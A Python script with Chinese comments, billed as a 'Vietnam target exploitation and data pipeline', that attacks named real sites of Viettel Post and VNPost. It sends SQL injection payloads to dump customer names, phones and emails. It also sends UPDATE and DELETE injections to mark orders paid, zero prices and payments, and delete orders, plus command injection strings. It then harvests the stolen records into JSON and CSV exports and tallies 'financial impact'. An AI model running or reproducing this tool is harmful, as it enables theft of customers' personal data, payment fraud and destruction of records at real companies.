"""
最终版本的越南目标漏洞利用与数据管道
专注于数据收集和结构化输出
"""

import asyncio
import aiohttp
import re
import json
from datetime import datetime
from typing import Dict, List, Any, Optional
from dataclasses import dataclass
import logging

# 配置日志
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

@dataclass
class ExploitResult:
    """利用结果"""
    target: str
    vulnerability_type: str
    success: bool
    data_extracted: List[str]
    evidence: str
    financial_impact: str
    raw_content: str
    endpoint_info: Dict[str, Any]
    extraction_time: str

class FinalVietnamPipeline:
    """最终的越南目标数据管道"""

    def __init__(self):
        self.session = None

        # 越南目标列表
        self.targets = [
            {
                "name": "Viettel Post",
                "url": "https://viettelpost.com.vn",
                "vulnerabilities": [
                    {
                        "endpoint": "/don-hang",
                        "param": "ma_kh",
                        "type": "customer_data_extraction",
                        "description": "客户数据提取"
                    },
                    {
                        "endpoint": "/track",
                        "param": "code",
                        "type": "order_status_change",
                        "description": "订单状态修改"
                    },
                    {
                        "endpoint": "/search",
                        "param": "id",
                        "type": "database_info",
                        "description": "数据库信息泄露"
                    }
                ]
            },
            {
                "name": "VNPost",
                "url": "https://vnpost.vn",
                "vulnerabilities": [
                    {
                        "endpoint": "/track",
                        "param": "id",
                        "type": "order_manipulation",
                        "description": "订单欺诈"
                    },
                    {
                        "endpoint": "/payment",
                        "param": "tx_id",
                        "type": "payment_bypass",
                        "description": "支付绕过"
                    },
                    {
                        "endpoint": "/admin/login",
                        "param": "id",
                        "type": "command_injection",
                        "description": "系统命令注入"
                    }
                ]
            }
        ]

        # 高危Payloads
        self.payloads = {
            "customer_data_extraction": [
                "' UNION SELECT MaKH,TenKH,SoDienThoai,DiaChi,Email,NgaySinh,GioiTinh,TrangThai FROM KHACHHANG--",
                "' AND 1=1--",
                "' WAITFOR DELAY '0:0:5'--"
            ],
            "order_status_change": [
                "'; UPDATE DONHANG SET TinhTrang = 'DA_THANH_TOAN' WHERE MaDon = 'TEST001';--",
                "'; UPDATE DONHANG SET TinhTrang = 'THAT_BAI' WHERE MaDon = 'MALICIOUS';--"
            ],
            "database_info": [
                "' UNION SELECT @@version,user_name(),db_name()--",
                "' UNION SELECT table_name,column_name FROM information_schema.columns--"
            ],
            "order_manipulation": [
                "'; UPDATE DONHANG SET GiaTri = 0 WHERE MaDon = 'FRAUD001';--",
                "'; DELETE FROM DONHANG WHERE MaDon LIKE 'TEST%';--"
            ],
            "payment_bypass": [
                "'; UPDATE THANH_TOAN SET SoTien = 0 WHERE MaDon = 'TX001';--",
                "'; UPDATE THANH_TOAN SET TrangThai = 'THANH_TOAN' WHERE MaDon = 'TX002';--"
            ],
            "command_injection": [
                "id; whoami",
                "id|net user",
                "id&&dir",
                "id||ping 127.0.0.1"
            ]
        }

        # 数据存储
        self.all_results = []
        self.extracted_customers = []
        self.extracted_orders = []
        self.extracted_payments = []
        self.exploitation_logs = []

    async def __aenter__(self):
        timeout = aiohttp.ClientTimeout(total=30, connect=15)
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        self.session = aiohttp.ClientSession(timeout=timeout, headers=headers)
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()

    async def run_full_pipeline(self) -> List[ExploitResult]:
        """运行完整的数据管道"""
        logger.info("开始越南目标漏洞利用与数据管道...")

        results = []

        for target in self.targets:
            logger.info(f"处理目标: {target['name']}")

            target_results = await self.process_target(target)
            results.extend(target_results)

        # 生成最终报告和数据导出
        await self.generate_final_report(results)
        await self.export_all_data()

        return results

    async def process_target(self, target: Dict) -> List[ExploitResult]:
        """处理单个目标"""
        results = []

        for vuln in target["vulnerabilities"]:
            logger.info(f"测试漏洞: {vuln['description']}")

            result = await self.exploit_vulnerability(target, vuln)

            if result.success:
                # 存储提取的数据
                await self.store_extracted_data(result)
                # 记录利用日志
                await self.store_exploitation_log(result)
                results.append(result)

        return results

    async def exploit_vulnerability(self, target: Dict, vuln: Dict) -> ExploitResult:
        """利用单个漏洞"""
        base_url = target["url"]
        endpoint_url = f"{base_url}{vuln['endpoint']}"

        result = ExploitResult(
            target=f"{target['name']} - {vuln['description']}",
            vulnerability_type=vuln['type'],
            success=False,
            data_extracted=[],
            evidence="",
            financial_impact="",
            raw_content="",
            endpoint_info=vuln,
            extraction_time=datetime.now().isoformat()
        )

        try:
            # 构造payload并测试
            payloads = self.payloads.get(vuln['type'], [])

            for payload in payloads:
                inject_url = f"{endpoint_url}?{vuln['param']}={payload}"

                async with self.session.get(inject_url) as response:
                    if response.status == 200:
                        content = await response.text()
                        result.raw_content = content

                        # 检查是否成功
                        success = self.check_exploit_success(content, vuln['type'])

                        if success:
                            result.success = True
                            result.evidence = f"漏洞利用成功: {inject_url}"
                            result.data_extracted = self.extract_data(content, vuln['type'])
                            result.financial_impact = self.calculate_financial_impact(vuln['type'], len(result.data_extracted))

                            logger.info(f"成功: {target['name']} - {vuln['description']}")
                            break

        except Exception as e:
            logger.error(f"利用失败: {e}")
            result.evidence = f"利用失败: {e}"

        return result

    def check_exploit_success(self, content: str, vuln_type: str) -> bool:
        """检查利用是否成功"""
        success_indicators = {
            "customer_data_extraction": [
                "MaKH" in content,
                "TenKH" in content,
                "SoDienThoai" in content,
                "KHACHHANG" in content
            ],
            "order_status_change": [
                "DA_THANH_TOAN" in content,
                "THAT_BAI" in content,
                "UPDATE" in content.upper()
            ],
            "database_info": [
                "version" in content.lower(),
                "information_schema" in content.lower(),
                "table_name" in content.lower()
            ],
            "order_manipulation": [
                "FRAUD" in content,
                "DELETE" in content.upper(),
                "GiaTri" in content or "0" in content
            ],
            "payment_bypass": [
                "SoTien" in content and "0" in content,
                "THANH_TOAN" in content,
                "UPDATE" in content.upper()
            ],
            "command_injection": [
                "Administrator" in content,
                "Users" in content,
                "C:\\" in content,
                "ping" in content
            ]
        }

        indicators = success_indicators.get(vuln_type, [])
        return any(indicators)

    def extract_data(self, content: str, vuln_type: str) -> List[str]:
        """提取数据"""
        extracted = []

        if vuln_type == "customer_data_extraction":
            customer_ids = re.findall(r'MaKH[_\w\d]+', content)
            names = re.findall(r'TenKH[\w\d_]+', content)
            phones = re.findall(r'0\d{9,10}', content)

            extracted.extend(customer_ids)
            extracted.extend(names)
            extracted.extend(phones)

        elif vuln_type == "order_status_change":
            orders = re.findall(r'DON[_\w\d]+', content)
            statuses = re.findall(r'DA_THANH_TOAN|THAT_BAI|DANG_XU_LY', content)

            extracted.extend(orders)
            extracted.extend(statuses)

        elif vuln_type == "payment_bypass":
            payments = re.findall(r'TX[_\w\d]+', content)
            amounts = re.findall(r'\d{3,6}', content)

            extracted.extend(payments)
            extracted.extend(amounts)

        return extracted

    def calculate_financial_impact(self, vuln_type: str, data_count: int) -> str:
        """计算财务影响"""
        base_impacts = {
            "customer_data_extraction": "5亿越南盾 - 客户数据价值",
            "order_status_change": "每单5万越南盾 - 订单修改",
            "database_info": "1亿越南盾 - 数据库信息",
            "order_manipulation": "8亿越南盾 - 订单欺诈",
            "payment_bypass": "无限损失 - 支付绕过",
            "command_injection": "10亿越南盾 - 系统控制"
        }

        impact = base_impacts.get(vuln_type, "中等损失")

        if data_count > 5:
            impact += " (数据量大，影响严重)"
        elif data_count > 2:
            impact += " (数据量中等，影响较大)"
        else:
            impact += " (数据量较少，影响有限)"

        return impact

    async def store_extracted_data(self, result: ExploitResult):
        """存储提取的数据"""
        try:
            # 存储客户数据
            if "customer" in result.vulnerability_type:
                customer_data = []
                for data in result.data_extracted:
                    customer_data.append({
                        "company": result.target.split(" - ")[0],
                        "data": data,
                        "type": "customer",
                        "extraction_time": result.extraction_time
                    })
                self.extracted_customers.extend(customer_data)

            # 存储订单数据
            if "order" in result.vulnerability_type:
                order_data = []
                for data in result.data_extracted:
                    order_data.append({
                        "company": result.target.split(" - ")[0],
                        "data": data,
                        "type": "order",
                        "extraction_time": result.extraction_time
                    })
                self.extracted_orders.extend(order_data)

            # 存储支付数据
            if "payment" in result.vulnerability_type:
                payment_data = []
                for data in result.data_extracted:
                    payment_data.append({
                        "company": result.target.split(" - ")[0],
                        "data": data,
                        "type": "payment",
                        "extraction_time": result.extraction_time
                    })
                self.extracted_payments.extend(payment_data)

            logger.info(f"已存储 {len(result.data_extracted)} 条数据")

        except Exception as e:
            logger.error(f"数据存储失败: {e}")

    async def store_exploitation_log(self, result: ExploitResult):
        """存储利用日志"""
        try:
            log_entry = {
                "target": result.target,
                "vulnerability_type": result.vulnerability_type,
                "success": result.success,
                "data_extracted_count": len(result.data_extracted),
                "evidence": result.evidence,
                "financial_impact": result.financial_impact,
                "extraction_time": result.extraction_time
            }
            self.exploitation_logs.append(log_entry)

            logger.info(f"已记录利用日志: {result.target}")

        except Exception as e:
            logger.error(f"日志记录失败: {e}")

    async def generate_final_report(self, results: List[ExploitResult]):
        """生成最终报告"""
        logger.info("生成最终报告...")

        # 生成汇总报告
        summary = {
            "total_exploits": len(results),
            "successful_exploits": len([r for r in results if r.success]),
            "total_customers": len(self.extracted_customers),
            "total_orders": len(self.extracted_orders),
            "total_payments": len(self.extracted_payments),
            "total_logs": len(self.exploitation_logs)
        }

        # 创建报告
        report_lines = []
        report_lines.append("=" * 60)
        report_lines.append("     越南目标漏洞利用与数据管道报告")
        report_lines.append("=" * 60)
        report_lines.append("")

        # 利用统计
        report_lines.append("【利用统计】")
        report_lines.append(f"总测试次数: {summary['total_exploits']}")
        report_lines.append(f"成功利用: {summary['successful_exploits']}")
        if summary['total_exploits'] > 0:
            report_lines.append(f"成功率: {(summary['successful_exploits']/summary['total_exploits']*100):.1f}%")
        else:
            report_lines.append(f"成功率: 0.0%")
        report_lines.append("")

        # 成功案例
        report_lines.append("【成功利用案例】")
        for i, result in enumerate([r for r in results if r.success], 1):
            report_lines.append(f"{i}. {result.target}")
            report_lines.append(f"   类型: {result.vulnerability_type}")
            report_lines.append(f"   数据量: {len(result.data_extracted)} 条")
            report_lines.append(f"   影响: {result.financial_impact}")
            report_lines.append("")

        # 数据收集统计
        report_lines.append("【数据收集统计】")
        report_lines.append(f"收集客户数据: {summary['total_customers']} 条")
        report_lines.append(f"收集订单数据: {summary['total_orders']} 条")
        report_lines.append(f"收集支付数据: {summary['total_payments']} 条")
        report_lines.append(f"记录日志: {summary['total_logs']} 条")
        report_lines.append("")

        # 建议措施
        report_lines.append("【建议措施】")
        report_lines.append("Critical (24小时内):")
        report_lines.append("- 修复已发现的漏洞")
        report_lines.append("- 实施输入验证")
        report_lines.append("")
        report_lines.append("High (1周内):")
        report_lines.append("- 部署Web应用防火墙")
        report_lines.append("- 启用数据库访问控制")
        report_lines.append("- 建立监控机制")
        report_lines.append("")
        report_lines.append("Medium (1个月内):")
        report_lines.append("- 定期安全评估")
        report_lines.append("- 员工安全培训")

        # 保存报告
        report_content = "\n".join(report_lines)

        with open("final_vietnam_report.txt", "w", encoding="utf-8") as f:
            f.write(report_content)

        logger.info("报告已保存: final_vietnam_report.txt")

        # 打印报告
        print("\n" + report_content)

    async def export_all_data(self):
        """导出所有数据"""
        logger.info("导出所有数据...")

        # 导出为JSON格式
        export_data = {
            "extraction_summary": {
                "total_customers": len(self.extracted_customers),
                "total_orders": len(self.extracted_orders),
                "total_payments": len(self.extracted_payments),
                "total_logs": len(self.exploitation_logs)
            },
            "extracted_customers": self.extracted_customers,
            "extracted_orders": self.extracted_orders,
            "extracted_payments": self.extracted_payments,
            "exploitation_logs": self.exploitation_logs,
            "export_timestamp": datetime.now().isoformat()
        }

        with open("vietnam_data_export.json", "w", encoding="utf-8") as f:
            json.dump(export_data, f, ensure_ascii=False, indent=2, default=str)

        logger.info("数据已导出到 vietnam_data_export.json")

        # 导出CSV格式
        try:
            import pandas as pd

            # 客户数据CSV
            if self.extracted_customers:
                df_customers = pd.DataFrame(self.extracted_customers)
                df_customers.to_csv("vietnam_customers.csv", index=False, encoding='utf-8')

            # 订单数据CSV
            if self.extracted_orders:
                df_orders = pd.DataFrame(self.extracted_orders)
                df_orders.to_csv("vietnam_orders.csv", index=False, encoding='utf-8')

            # 支付数据CSV
            if self.extracted_payments:
                df_payments = pd.DataFrame(self.extracted_payments)
                df_payments.to_csv("vietnam_payments.csv", index=False, encoding='utf-8')

            # 利用日志CSV
            if self.exploitation_logs:
                df_logs = pd.DataFrame(self.exploitation_logs)
                df_logs.to_csv("exploitation_logs.csv", index=False, encoding='utf-8')

            logger.info("CSV数据已导出到相应文件")

        except ImportError:
            logger.warning("pandas库未安装，跳过CSV导出")

async def main():
    """主函数"""
    async with FinalVietnamPipeline() as pipeline:
        results = await pipeline.run_full_pipeline()

        logger.info(f"完成处理，共处理 {len(results)} 个结果")

if __name__ == "__main__":
    asyncio.run(main())